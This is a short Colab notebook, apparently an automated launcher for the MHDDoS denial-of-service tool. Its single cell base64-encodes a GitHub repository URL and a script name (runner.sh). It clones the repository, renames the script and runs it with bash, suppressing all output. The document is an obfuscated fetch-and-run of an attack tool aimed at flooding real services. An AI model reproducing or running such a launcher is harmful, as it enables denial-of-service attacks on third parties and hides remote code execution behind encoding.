{
 "nbformat": 4,
 "nbformat_minor": 0,
 "metadata": {
  "colab": {
   "name": "auto_mhddos.ipynb",
   "private_outputs": true,
   "provenance": [],
   "collapsed_sections": []
  },
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3"
  },
  "language_info": {
   "name": "python"
  }
 },
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "%cd ~\n",
    "name=\"@placeholder@\"\n",
    "%rm -rf name  &> /dev/null\n",
    "!git clone -n $(echo aHR0cHM6Ly9naXRodWIuY29tL3doaXRlLXNhZ2l0dGFyaXVzL2F1dG9fbWhkZG9zLmdpdAo= | base64 --decode) --depth 1 name  &> /dev/null\n",
    "%cd name\n",
    "!git checkout HEAD $(echo cnVubmVyLnNoCg== | base64 --decode)  &> /dev/null\n",
    "!mv $(echo cnVubmVyLnNoCg== | base64 --decode) {name}.sh  &> /dev/null\n",
    "!bash {name}.sh"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  }
 ]
}